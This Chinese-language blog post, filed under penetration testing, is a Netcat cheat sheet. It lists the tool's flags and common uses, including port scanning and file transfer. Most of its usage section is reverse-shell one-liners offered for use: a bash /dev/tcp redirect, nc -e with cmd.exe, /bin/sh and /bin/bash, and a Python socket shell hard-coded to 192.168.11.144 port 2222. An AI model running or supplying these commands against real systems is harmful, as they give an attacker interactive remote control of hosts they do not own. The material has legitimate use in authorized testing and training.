Netcat工具

发表于 2021-11-10 更新于 2021-11-16 分类于 渗透

Netcat

Netcat参数：

  1. -c shell命令为“-e”；使用/bin/sh执行
  2. -e 文件名连接后要执行的程序
  3. -b 允许广播
  4. -g 网关源路由跃点，最多8个
  5. -G num源路由指针：4，8，12
  6. -l 侦听模式，用于入站连接
  7. -n 仅数字IP地址，无DNS
  8. -o 文件十六进制流量转储
  9. -p 端口本地端口号
  10. -r 随机化本地和远程端口
  11. -q 秒在标准DIN上的EOF和秒延迟后退出
  12. -s 地址本地源地址
  13. -T tos集合服务类型
  14. -u UDP模式
  15. -v verbose[使用两次更详细]
  16. -C 发送CRLF作为行结束
  17. -z 零I/O模式[用于扫描]

Netcat常见使用方法：

  1. 监听本地端口，以详细列出

    格式：nc -lvvp [Port]

  2. 扫描目标指定端口范围开放状态

    格式：nc -v -z [Ip] [Port]

  3. UDP扫描端口并返回端口信息

    格式：nc -v -z -u [Ip] [Port]

  4. 在目标机没有nc的情况下

    格式：bash -i >& /dev/tcp/Ip/Port 0>&1

    本地机：

    目标机：

  5. windows下反弹cmd

    格式：nc [Ip] [Port] -e cmd.exe

  6. linux下反弹cmd

    格式：nc [Ip] [Port] -e /bin/sh

  7. 文件传输

    格式：nc -lvvp 8888 < 1.txt 服务端
	 nc -vn [Ip] 8888 > 1.txt 客户端

  8. nc反弹nc

    格式：nc -e /bin/bash [Ip] [Port]

  9. http请求（也可以进行ftp匿名探测）

    格式：nc [Ip] [21]

  10. python构造连接

    格式：python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.144",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
